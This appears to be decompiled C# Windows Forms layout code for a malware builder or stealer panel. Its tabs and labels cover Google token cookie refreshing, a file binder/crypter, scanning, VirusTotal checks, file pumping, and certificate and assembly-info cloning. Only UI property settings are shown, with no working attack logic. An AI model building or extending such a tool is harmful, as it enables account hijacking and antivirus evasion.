        ((System.Windows.Forms.Control)this.openIconBtn).Name = "openIconBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.openIconBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.openIconBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.openIconBtn).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.openIconBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.openIconBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.openIconBtn).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.openIconBtn).Size = new System.Drawing.Size(65, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.openIconBtn).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.openIconBtn).StyleManager = null;
        ((System.Windows.Forms.Control)this.openIconBtn).TabIndex = 47;
        ((System.Windows.Forms.Control)this.openIconBtn).Text = "Open";
        ((MetroSet_UI.Controls.MetroSetButton)this.openIconBtn).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.openIconBtn).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.openIconBtn).Click += new System.EventHandler(openIconBtn_Click);
        ((GuiLib.AnimaTextBox)this.iconPath).Dark = false;
        ((System.Windows.Forms.Control)this.iconPath).Location = new System.Drawing.Point(342, 183);
        ((GuiLib.AnimaTextBox)this.iconPath).MaxLength = 32767;
        ((GuiLib.AnimaTextBox)this.iconPath).MultiLine = false;
        ((System.Windows.Forms.Control)this.iconPath).Name = "iconPath";
        ((GuiLib.AnimaTextBox)this.iconPath).Numeric = false;
        ((GuiLib.AnimaTextBox)this.iconPath).ReadOnly = false;
        ((System.Windows.Forms.Control)this.iconPath).Size = new System.Drawing.Size(367, 23);
        ((System.Windows.Forms.Control)this.iconPath).TabIndex = 46;
        ((GuiLib.AnimaTextBox)this.iconPath).UseSystemPasswordChar = false;
        ((System.Windows.Forms.Control)this.label18).AutoSize = true;
        ((System.Windows.Forms.Control)this.label18).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.label18).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.label18).Location = new System.Drawing.Point(342, 165);
        ((System.Windows.Forms.Control)this.label18).Name = "label18";
        ((System.Windows.Forms.Control)this.label18).Size = new System.Drawing.Size(54, 15);
        ((System.Windows.Forms.Control)this.label18).TabIndex = 45;
        ((System.Windows.Forms.Control)this.label18).Text = "Icon File:";
        ((System.Windows.Forms.Control)this.refresherTab).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.Control)this.refresherTab).Controls.Add((System.Windows.Forms.Control)this.label34);
        ((System.Windows.Forms.Control)this.refresherTab).Controls.Add((System.Windows.Forms.Control)this.freshCookiesTb);
        ((System.Windows.Forms.Control)this.refresherTab).Controls.Add((System.Windows.Forms.Control)this.refreshCookiesBtn);
        ((System.Windows.Forms.Control)this.refresherTab).Controls.Add((System.Windows.Forms.Control)this.accessTokenTb);
        ((System.Windows.Forms.Control)this.refresherTab).Controls.Add((System.Windows.Forms.Control)this.refreshCookiesLbl);
        ((System.Windows.Forms.Control)this.refresherTab).ForeColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.TabPage)this.refresherTab).Location = new System.Drawing.Point(194, 4);
        ((System.Windows.Forms.Control)this.refresherTab).Name = "refresherTab";
        ((System.Windows.Forms.Control)this.refresherTab).Size = new System.Drawing.Size(1168, 639);
        ((System.Windows.Forms.TabPage)this.refresherTab).TabIndex = 24;
        ((System.Windows.Forms.Control)this.refresherTab).Text = "Cookie Refresher";
        ((System.Windows.Forms.Control)this.label34).AutoSize = true;
        ((System.Windows.Forms.Control)this.label34).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.label34).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.label34).Location = new System.Drawing.Point(14, 3);
        ((System.Windows.Forms.Control)this.label34).Name = "label34";
        ((System.Windows.Forms.Control)this.label34).Size = new System.Drawing.Size(127, 15);
        ((System.Windows.Forms.Control)this.label34).TabIndex = 119;
        ((System.Windows.Forms.Control)this.label34).Text = "Fresh account cookies:";
        ((GuiLib.AnimaTextBox)this.freshCookiesTb).Dark = false;
        ((System.Windows.Forms.Control)this.freshCookiesTb).Location = new System.Drawing.Point(17, 21);
        ((GuiLib.AnimaTextBox)this.freshCookiesTb).MaxLength = 32767;
        ((GuiLib.AnimaTextBox)this.freshCookiesTb).MultiLine = true;
        ((System.Windows.Forms.Control)this.freshCookiesTb).Name = "freshCookiesTb";
        ((GuiLib.AnimaTextBox)this.freshCookiesTb).Numeric = false;
        ((GuiLib.AnimaTextBox)this.freshCookiesTb).ReadOnly = true;
        ((System.Windows.Forms.Control)this.freshCookiesTb).Size = new System.Drawing.Size(1143, 565);
        ((System.Windows.Forms.Control)this.freshCookiesTb).TabIndex = 118;
        ((GuiLib.AnimaTextBox)this.freshCookiesTb).UseSystemPasswordChar = false;
        ((MetroSet_UI.Controls.MetroSetButton)this.refreshCookiesBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.refreshCookiesBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.refreshCookiesBtn).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.refreshCookiesBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.refreshCookiesBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.refreshCookiesBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.refreshCookiesBtn).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.refreshCookiesBtn).Location = new System.Drawing.Point(1029, 607);
        ((System.Windows.Forms.Control)this.refreshCookiesBtn).Name = "refreshCookiesBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.refreshCookiesBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.refreshCookiesBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.refreshCookiesBtn).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.refreshCookiesBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.refreshCookiesBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.refreshCookiesBtn).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.refreshCookiesBtn).Size = new System.Drawing.Size(131, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.refreshCookiesBtn).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.refreshCookiesBtn).StyleManager = null;
        ((System.Windows.Forms.Control)this.refreshCookiesBtn).TabIndex = 50;
        ((System.Windows.Forms.Control)this.refreshCookiesBtn).Text = "Refresh";
        ((MetroSet_UI.Controls.MetroSetButton)this.refreshCookiesBtn).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.refreshCookiesBtn).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.refreshCookiesBtn).Click += new System.EventHandler(refreshCookiesBtn_Click);
        ((GuiLib.AnimaTextBox)this.accessTokenTb).Dark = false;
        ((System.Windows.Forms.Control)this.accessTokenTb).Location = new System.Drawing.Point(17, 607);
        ((GuiLib.AnimaTextBox)this.accessTokenTb).MaxLength = 32767;
        ((GuiLib.AnimaTextBox)this.accessTokenTb).MultiLine = false;
        ((System.Windows.Forms.Control)this.accessTokenTb).Name = "accessTokenTb";
        ((GuiLib.AnimaTextBox)this.accessTokenTb).Numeric = false;
        ((GuiLib.AnimaTextBox)this.accessTokenTb).ReadOnly = false;
        ((System.Windows.Forms.Control)this.accessTokenTb).Size = new System.Drawing.Size(1006, 23);
        ((System.Windows.Forms.Control)this.accessTokenTb).TabIndex = 49;
        ((GuiLib.AnimaTextBox)this.accessTokenTb).UseSystemPasswordChar = false;
        ((System.Windows.Forms.Control)this.refreshCookiesLbl).AutoSize = true;
        ((System.Windows.Forms.Control)this.refreshCookiesLbl).Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.refreshCookiesLbl).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.refreshCookiesLbl).Location = new System.Drawing.Point(14, 589);
        ((System.Windows.Forms.Control)this.refreshCookiesLbl).Name = "refreshCookiesLbl";
        ((System.Windows.Forms.Control)this.refreshCookiesLbl).Size = new System.Drawing.Size(127, 15);
        ((System.Windows.Forms.Control)this.refreshCookiesLbl).TabIndex = 48;
        ((System.Windows.Forms.Control)this.refreshCookiesLbl).Text = "Google account token:";
        ((System.Windows.Forms.Control)this.mergerTab).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.Control)this.mergerTab).Controls.Add((System.Windows.Forms.Control)this.metroSetButton1);
        ((System.Windows.Forms.Control)this.mergerTab).Controls.Add((System.Windows.Forms.Control)this.mergeBtn);
        ((System.Windows.Forms.Control)this.mergerTab).Controls.Add((System.Windows.Forms.Control)this.metroSetButton6);
        ((System.Windows.Forms.Control)this.mergerTab).Controls.Add((System.Windows.Forms.Control)this.fileToMergeLb);
        ((System.Windows.Forms.Control)this.mergerTab).Controls.Add((System.Windows.Forms.Control)this.label25);
        ((System.Windows.Forms.Control)this.mergerTab).ForeColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.TabPage)this.mergerTab).Location = new System.Drawing.Point(194, 4);
        ((System.Windows.Forms.Control)this.mergerTab).Name = "mergerTab";
        ((System.Windows.Forms.Control)this.mergerTab).Padding = new System.Windows.Forms.Padding(3);
        ((System.Windows.Forms.Control)this.mergerTab).Size = new System.Drawing.Size(1168, 639);
        ((System.Windows.Forms.TabPage)this.mergerTab).TabIndex = 22;
        ((System.Windows.Forms.Control)this.mergerTab).Text = "Binder/Crypt";
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton1).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton1).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton1).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.metroSetButton1).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton1).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton1).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton1).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.metroSetButton1).Location = new System.Drawing.Point(310, 386);
        ((System.Windows.Forms.Control)this.metroSetButton1).Name = "metroSetButton1";
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton1).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton1).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton1).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton1).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton1).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton1).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.metroSetButton1).Size = new System.Drawing.Size(59, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton1).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton1).StyleManager = null;
        ((System.Windows.Forms.Control)this.metroSetButton1).TabIndex = 138;
        ((System.Windows.Forms.Control)this.metroSetButton1).Text = "Add";
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton1).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton1).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.metroSetButton1).Click += new System.EventHandler(metroSetButton1_Click);
        ((MetroSet_UI.Controls.MetroSetButton)this.mergeBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.mergeBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.mergeBtn).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.mergeBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.mergeBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.mergeBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.mergeBtn).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.mergeBtn).Location = new System.Drawing.Point(854, 386);
        ((System.Windows.Forms.Control)this.mergeBtn).Name = "mergeBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.mergeBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.mergeBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.mergeBtn).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.mergeBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.mergeBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.mergeBtn).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.mergeBtn).Size = new System.Drawing.Size(78, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.mergeBtn).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.mergeBtn).StyleManager = null;
        ((System.Windows.Forms.Control)this.mergeBtn).TabIndex = 137;
        ((System.Windows.Forms.Control)this.mergeBtn).Text = "Build";
        ((MetroSet_UI.Controls.MetroSetButton)this.mergeBtn).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.mergeBtn).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.mergeBtn).Click += new System.EventHandler(mergeBtn_Click);
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton6).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton6).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton6).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.metroSetButton6).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton6).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton6).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton6).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.metroSetButton6).Location = new System.Drawing.Point(384, 386);
        ((System.Windows.Forms.Control)this.metroSetButton6).Name = "metroSetButton6";
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton6).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton6).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton6).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton6).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton6).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton6).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.metroSetButton6).Size = new System.Drawing.Size(59, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton6).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton6).StyleManager = null;
        ((System.Windows.Forms.Control)this.metroSetButton6).TabIndex = 136;
        ((System.Windows.Forms.Control)this.metroSetButton6).Text = "Delete";
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton6).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton6).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.metroSetButton6).Click += new System.EventHandler(metroSetButton6_Click);
        ((System.Windows.Forms.Control)this.fileToMergeLb).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.ListBox)this.fileToMergeLb).BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
        ((System.Windows.Forms.Control)this.fileToMergeLb).Cursor = System.Windows.Forms.Cursors.Default;
        ((System.Windows.Forms.Control)this.fileToMergeLb).Font = new System.Drawing.Font("Consolas", 11.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.fileToMergeLb).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.ListBox)this.fileToMergeLb).HorizontalScrollbar = true;
        ((System.Windows.Forms.ListBox)this.fileToMergeLb).ItemHeight = 18;
        ((System.Windows.Forms.Control)this.fileToMergeLb).Location = new System.Drawing.Point(310, 162);
        ((System.Windows.Forms.Control)this.fileToMergeLb).Name = "fileToMergeLb";
        ((System.Windows.Forms.Control)this.fileToMergeLb).Size = new System.Drawing.Size(622, 218);
        ((System.Windows.Forms.Control)this.fileToMergeLb).TabIndex = 135;
        ((System.Windows.Forms.Control)this.label25).Font = new System.Drawing.Font("Segoe UI", 15.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.label25).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.label25).Location = new System.Drawing.Point(305, 129);
        ((System.Windows.Forms.Control)this.label25).Name = "label25";
        ((System.Windows.Forms.Control)this.label25).Size = new System.Drawing.Size(202, 30);
        ((System.Windows.Forms.Control)this.label25).TabIndex = 134;
        ((System.Windows.Forms.Control)this.label25).Text = "Files to bind/crypt :";
        ((System.Windows.Forms.Label)this.label25).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((System.Windows.Forms.Control)this.scannerTab).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.Control)this.scannerTab).Controls.Add((System.Windows.Forms.Control)this.label33);
        ((System.Windows.Forms.Control)this.scannerTab).Controls.Add((System.Windows.Forms.Control)this.fileScanBtn);
        ((System.Windows.Forms.Control)this.scannerTab).Controls.Add((System.Windows.Forms.Control)this.scanResults);
        ((System.Windows.Forms.Control)this.scannerTab).ForeColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.TabPage)this.scannerTab).Location = new System.Drawing.Point(194, 4);
        ((System.Windows.Forms.Control)this.scannerTab).Name = "scannerTab";
        ((System.Windows.Forms.Control)this.scannerTab).Size = new System.Drawing.Size(1168, 639);
        ((System.Windows.Forms.TabPage)this.scannerTab).TabIndex = 23;
        ((System.Windows.Forms.Control)this.scannerTab).Text = "Scanner";
        ((System.Windows.Forms.Control)this.label33).Font = new System.Drawing.Font("Segoe UI", 15.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.label33).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.label33).Location = new System.Drawing.Point(262, 21);
        ((System.Windows.Forms.Control)this.label33).Name = "label33";
        ((System.Windows.Forms.Control)this.label33).Size = new System.Drawing.Size(140, 30);
        ((System.Windows.Forms.Control)this.label33).TabIndex = 122;
        ((System.Windows.Forms.Control)this.label33).Text = "Scan result:";
        ((System.Windows.Forms.Label)this.label33).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((MetroSet_UI.Controls.MetroSetButton)this.fileScanBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.fileScanBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.fileScanBtn).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.fileScanBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.fileScanBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.fileScanBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.fileScanBtn).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.fileScanBtn).Location = new System.Drawing.Point(832, 608);
        ((System.Windows.Forms.Control)this.fileScanBtn).Name = "fileScanBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.fileScanBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.fileScanBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.fileScanBtn).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.fileScanBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.fileScanBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.fileScanBtn).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.fileScanBtn).Size = new System.Drawing.Size(75, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.fileScanBtn).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.fileScanBtn).StyleManager = null;
        ((System.Windows.Forms.Control)this.fileScanBtn).TabIndex = 121;
        ((System.Windows.Forms.Control)this.fileScanBtn).Text = "Scan";
        ((MetroSet_UI.Controls.MetroSetButton)this.fileScanBtn).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.fileScanBtn).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.fileScanBtn).Click += new System.EventHandler(fileScanBtn_Click);
        ((GuiLib.AnimaTextBox)this.scanResults).Dark = false;
        ((System.Windows.Forms.Control)this.scanResults).Location = new System.Drawing.Point(267, 54);
        ((GuiLib.AnimaTextBox)this.scanResults).MaxLength = 32767;
        ((GuiLib.AnimaTextBox)this.scanResults).MultiLine = true;
        ((System.Windows.Forms.Control)this.scanResults).Name = "scanResults";
        ((GuiLib.AnimaTextBox)this.scanResults).Numeric = false;
        ((GuiLib.AnimaTextBox)this.scanResults).ReadOnly = true;
        ((System.Windows.Forms.Control)this.scanResults).Size = new System.Drawing.Size(640, 548);
        ((System.Windows.Forms.Control)this.scanResults).TabIndex = 120;
        ((GuiLib.AnimaTextBox)this.scanResults).UseSystemPasswordChar = false;
        ((System.Windows.Forms.Control)this.miscTab).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.Control)this.miscTab).Controls.Add((System.Windows.Forms.Control)this.virusTotalTextbox);
        ((System.Windows.Forms.Control)this.miscTab).Controls.Add((System.Windows.Forms.Control)this.metroSetButton3);
        ((System.Windows.Forms.Control)this.miscTab).Controls.Add((System.Windows.Forms.Control)this.virusTotalKey);
        ((System.Windows.Forms.Control)this.miscTab).Controls.Add((System.Windows.Forms.Control)this.label47);
        ((System.Windows.Forms.Control)this.miscTab).Controls.Add((System.Windows.Forms.Control)this.openVirusTotalFile);
        ((System.Windows.Forms.Control)this.miscTab).Controls.Add((System.Windows.Forms.Control)this.virustotalFile);
        ((System.Windows.Forms.Control)this.miscTab).Controls.Add((System.Windows.Forms.Control)this.label48);
        ((System.Windows.Forms.Control)this.miscTab).Controls.Add((System.Windows.Forms.Control)this.metroSetDivider19);
        ((System.Windows.Forms.Control)this.miscTab).Controls.Add((System.Windows.Forms.Control)this.pumpBtn);
        ((System.Windows.Forms.Control)this.miscTab).Controls.Add((System.Windows.Forms.Control)this.bytesCount);
        ((System.Windows.Forms.Control)this.miscTab).Controls.Add((System.Windows.Forms.Control)this.bytesCountLbl);
        ((System.Windows.Forms.Control)this.miscTab).Controls.Add((System.Windows.Forms.Control)this.openPumpBtn);
        ((System.Windows.Forms.Control)this.miscTab).Controls.Add((System.Windows.Forms.Control)this.pumpPath);
        ((System.Windows.Forms.Control)this.miscTab).Controls.Add((System.Windows.Forms.Control)this.pumpPathLbl);
        ((System.Windows.Forms.Control)this.miscTab).Controls.Add((System.Windows.Forms.Control)this.cloneBtn);
        ((System.Windows.Forms.Control)this.miscTab).Controls.Add((System.Windows.Forms.Control)this.certificate);
        ((System.Windows.Forms.Control)this.miscTab).Controls.Add((System.Windows.Forms.Control)this.certificateLbl);
        ((System.Windows.Forms.Control)this.miscTab).Controls.Add((System.Windows.Forms.Control)this.assemblyInfo);
        ((System.Windows.Forms.Control)this.miscTab).Controls.Add((System.Windows.Forms.Control)this.assemblyInfoLbl);
        ((System.Windows.Forms.Control)this.miscTab).Controls.Add((System.Windows.Forms.Control)this.metroSetDivider13);
        ((System.Windows.Forms.Control)this.miscTab).Controls.Add((System.Windows.Forms.Control)this.openBuildBtn);
        ((System.Windows.Forms.Control)this.miscTab).Controls.Add((System.Windows.Forms.Control)this.buildPathTb);
        ((System.Windows.Forms.Control)this.miscTab).Controls.Add((System.Windows.Forms.Control)this.buildPathLbl);
        ((System.Windows.Forms.Control)this.miscTab).Controls.Add((System.Windows.Forms.Control)this.openTargetBtn);
        ((System.Windows.Forms.Control)this.miscTab).Controls.Add((System.Windows.Forms.Control)this.targetPathTb);
        ((System.Windows.Forms.Control)this.miscTab).Controls.Add((System.Windows.Forms.Control)this.targetPathLbl);
        ((System.Windows.Forms.Control)this.miscTab).ForeColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.TabPage)this.miscTab).Location = new System.Drawing.Point(194, 4);
        ((System.Windows.Forms.Control)this.miscTab).Name = "miscTab";
        ((System.Windows.Forms.Control)this.miscTab).Size = new System.Drawing.Size(1168, 639);
        ((System.Windows.Forms.TabPage)this.miscTab).TabIndex = 21;
        ((System.Windows.Forms.Control)this.miscTab).Text = "Misc";
        ((GuiLib.AnimaTextBox)this.virusTotalTextbox).Dark = false;
        ((System.Windows.Forms.Control)this.virusTotalTextbox).Location = new System.Drawing.Point(299, 446);
        ((GuiLib.AnimaTextBox)this.virusTotalTextbox).MaxLength = 32767;
        ((GuiLib.AnimaTextBox)this.virusTotalTextbox).MultiLine = true;
        ((System.Windows.Forms.Control)this.virusTotalTextbox).Name = "virusTotalTextbox";
        ((GuiLib.AnimaTextBox)this.virusTotalTextbox).Numeric = false;
        ((GuiLib.AnimaTextBox)this.virusTotalTextbox).ReadOnly = true;
        ((System.Windows.Forms.Control)this.virusTotalTextbox).Size = new System.Drawing.Size(438, 186);
        ((System.Windows.Forms.Control)this.virusTotalTextbox).TabIndex = 155;
        ((GuiLib.AnimaTextBox)this.virusTotalTextbox).UseSystemPasswordChar = false;
        ((MetroSet_UI.Controls.MetroSetButton)this.metroSetButton3).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
